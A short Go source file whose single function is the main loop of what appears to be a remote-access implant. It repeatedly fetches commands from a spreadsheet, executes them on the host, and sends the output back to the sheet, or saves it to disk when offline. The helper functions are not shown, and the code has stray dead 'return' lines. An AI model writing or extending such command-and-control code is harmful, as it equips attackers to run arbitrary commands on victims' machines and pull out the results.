package main

import (
	"log"
	"time"
)

func starter() {
	log.Println("Loadded succesfully, starting to run")
	for {
		time.Sleep(loopSleepSeconds)
		commands := getCommandsFromSheet()
		if commands == nil {
			continue
			return
		}

		var commandOutput []string
		for _, element := range commands {
			output, errOut, err := execute(element[0], element[1])
			if err == nil {
				commandOutput = append(commandOutput, output)
			} else {
				commandOutput = append(commandOutput, errOut)
			}
		}
		if checkConnection() != nil && writeToDisk {
			writeOutToDisk(commandOutput)
			continue
			return
		}
		err := sendOutputToSheet(commandOutput)
		if err != nil && writeToDisk {
			writeOutToDisk(commandOutput)
			continue
			return
		}
	}
}
